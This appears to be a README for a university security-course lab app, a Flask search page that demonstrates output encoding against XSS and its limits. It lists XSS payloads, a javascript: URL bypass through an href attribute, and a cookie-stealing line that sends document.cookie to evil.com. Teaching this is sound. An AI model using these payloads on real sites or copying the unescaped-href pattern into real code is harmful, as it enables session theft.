# Output Encoding Demo - TerrierSearch

A demonstration of XSS prevention using output encoding for EC521 Introduction to Cybersecurity.

## Overview

This demo shows how **output encoding** prevents basic XSS attacks by escaping HTML entities. However, it also demonstrates the **limitations** of relying on encoding alone.

**This is Step 2 of 3** in the XSS demo progression:
1. **Unsanitized** (port 5004): No protection - vulnerable
2. **Encoded** (port 5005): Output encoding only (this demo)
3. **CSP + HttpOnly** (port 5006): Full protection

## Learning Objectives

- Understand how output encoding prevents XSS
- Learn the limitations of encoding-only protection
- Recognize why defense-in-depth is important

## Setup

### Requirements

- Python 3.7+
- Flask

### Installation

```bash
pip install -r requirements.txt
```

### Running the App

```bash
python app.py
```

Visit `http://localhost:5005` in your browser.

## How Output Encoding Works

User input is HTML-escaped before rendering:

| Input | Encoded Output |
|-------|----------------|
| `<script>` | `&lt;script&gt;` |
| `<img>` | `&lt;img&gt;` |
| `"` | `&quot;` |
| `'` | `&#39;` |

The browser displays these as text instead of interpreting them as HTML.

## Try These Attacks

### Attacks That Are Blocked

| Payload | Result |
|---------|--------|
| `<script>alert('XSS')</script>` | Displayed as text ✓ |
| `<img src=x onerror=alert('XSS')>` | Displayed as text ✓ |

**Encoding works for HTML context!** But...

### Attack That BYPASSES Encoding

The "Share this search" link puts your query in an `href` attribute:

```html
<a href="{{ query }}">Share this search</a>
```

**Try this:**
```
javascript:alert(document.cookie)
```

Then click "Share this search" - **the JavaScript executes!**

This works because `javascript:` contains no characters that HTML encoding escapes (`< > " ' &`), so it passes through unchanged.

## Limitations of Encoding Alone

### 1. Context Matters

HTML encoding doesn't protect all contexts:

```html
<!-- HTML context - encoding works -->
<p>{{ user_input }}</p>

<!-- JavaScript context - encoding NOT enough! -->
<script>var x = "{{ user_input }}";</script>

<!-- URL context - needs URL encoding -->
<a href="{{ user_input }}">Click</a>
```

### 2. Developer Error

One forgotten `| safe` breaks everything:

```python
# SAFE
{{ query }}

# VULNERABLE - one mistake undoes all protection
{{ query | safe }}
```

### 3. Cookie Still Exposed

This demo does NOT use HttpOnly cookies. If encoding ever fails:

```javascript
// Attacker could steal the cookie
document.location = 'http://evil.com/?c=' + document.cookie
```

### 4. No Safety Net

If a new attack vector bypasses encoding, there's no backup protection.

## Files

| File | Description |
|------|-------------|
| `app.py` | Flask app with output encoding only |
| `static/terrier.png` | Logo image |
| `requirements.txt` | Python dependencies |
| `README.md` | This documentation |

## Comparison

| Feature | Unsanitized | Encoded | CSP+HttpOnly |
|---------|-------------|---------|--------------|
| Output Encoding | ❌ | ✅ | ✅ |
| CSP Header | ❌ | ❌ | ✅ |
| HttpOnly Cookie | ❌ | ❌ | ✅ |
| `<script>` blocked | ❌ | ✅ | ✅ |
| Event handlers blocked | ❌ | ✅ | ✅ |
| `javascript:` URLs blocked | ❌ | ❌ | ✅ |
| Cookie protected | ❌ | ❌ | ✅ |

**Next Step:** See the CSP+HttpOnly version (port 5006) for full protection.

## All Demos in This Series

| Folder | Port | Description |
|--------|------|-------------|
| cookie-demo | 5000 | Cookie manipulation attack |
| sqli-classic | 5001 | Classic SQL injection in login form |
| sqli-blind | 5002 | Boolean-based blind SQL injection |
| sqli-secure | 5003 | SQL injection prevention with prepared statements |
| xss-reflected | 5004 | Cross-site scripting via search (vulnerable) |
| **xss-encoded** | 5005 | Output encoding only (this demo) |
| xss-csp | 5006 | Full protection with CSP |
| xss-stored | 5007 | Stored XSS in notes app |
| xss-dom | 5008 | DOM-based XSS |

## License

Educational use only - EC521 Boston University
